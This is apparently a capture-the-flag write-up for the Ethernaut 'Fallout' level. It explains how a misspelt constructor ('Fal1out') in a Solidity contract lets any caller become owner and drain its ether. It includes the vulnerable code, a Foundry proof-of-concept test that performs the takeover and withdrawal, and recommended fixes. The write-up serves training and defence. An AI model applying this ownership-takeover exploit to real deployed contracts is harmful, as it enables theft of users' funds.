# Level 2 - Fallout

## Objectives

- claim ownership of the contract

## Contract Overview

The `Fallout` contract works like a bank. It allows users (allocators) to
allocate ether into their separate balances.

- User can deposit money via `allocate()` function.
  - Their allocation will be saved in the `allocations` mapping.

```solidity
  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }
```

- Users can withdraw the money at any time via the `sendAllocation()` function
  by specifying themselves as the beneficiary in the function parameter.
- Users can also send their allocations to other allocators (they need to be
  present in the mapping) via the same `sendAllocation()` function.

  ```solidity
  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }
  ```

- The owner of the `Fallout` contract can withdraw all of the gathered funds at
  any time via the `collectAllocations()` function.
  ```solidity
  function collectAllocations() public onlyOwner {
  msg.sender.transfer(address(this).balance);
  }
  ```
- User can check the current balance of any allocator via the `allocatorBalance()` function.
  ```solidity
  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
  ```

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Fallout_slither.png)

## Finding the weak spots

The method has a comment that mentions that it's the contructor. Constructor methods run only right after the contract is deployed and they're commonly used to initialize the contract's state, like assigning an owner in this case. Constructors are declared using the constructor keyword or a function with the same name as the contract, in this case `Fallout`.

This contract is using solidity `^0.6.0` where construct should have the same name as name of contract so it should be named `Fallout()` but we have a misspelt here because what looks like the constructor is just a misspelt function `Fal1out` that can be called by anyone to claim ownership.

In other words the contract does not use the `constructor()` function, but instead a publicly accessible function named Fal1out(). Any account that sends some Ether to this function will be set as the new owner of the contract.

```solidity
  /* constructor */
  function Fal1out() public payable { // <-- this line over here
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

## Potential attack scenario (hypothesis)

Attacker can call the faulty constructor and claim ownership of the contract. He can then withdraw all the funds.

## Plan of the attack

1. Attacker can call the `Fal1out()` function which will set him as the owner of the `Fallout` contract.
2. Attacker as the owner can withdraw all the funds.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/02-Fallout.t.sol))

```solidity
        // Attacker can call the `Fal1out()` function which will set him as the owner of the `Fallout` contract.
        emit log_string("Calling Fal1out() function");
        falloutContract.Fal1out{value: 1}();

        emit log_named_address(
            "New owner of the contract: ",
            falloutContract.owner()
        );

        // Attacker as owner can withdraw all the funds
        emit log_named_uint(
            "Balance of the contract before withdrawal: ",
            address(falloutContract).balance
        );

        emit log_string("Calling collectAllocations() function");
        falloutContract.collectAllocations();

        emit log_named_uint(
            "Balance of the contract after withdrawal: ",
            address(falloutContract).balance
        );

        // Test assertion
        assertEq(falloutContract.owner(), attacker);

        assertEq(address(falloutContract).balance, 0);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Fallout.png)

## Recommendations

1. \[CRITICAL\] The constructor of the `Fallout` contract should be fixed. Here
   is an example fix:

```solidity
constructor () public payable {
	owner = msg.sender;
	allocations[owner] = msg.value;
}
```

2. The emission of events should be added to the critical contract functions
   that modify the state of the contract. This will allow for better
   communication with off-chain components. It will also provide users with a
   better sense of what is happening inside the contract.
3. The use of OpenZeppelin TimelockController is recommended on
   `collectAllocations()` function to provide a better user experience and
   increase safety.

## Additional information

You can also read my two other solutions (using console and Remix) on my blog: https://matrix-0wl.gitbook.io/ethernaut/2.-fallout-typo-in-constructor

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

```

```
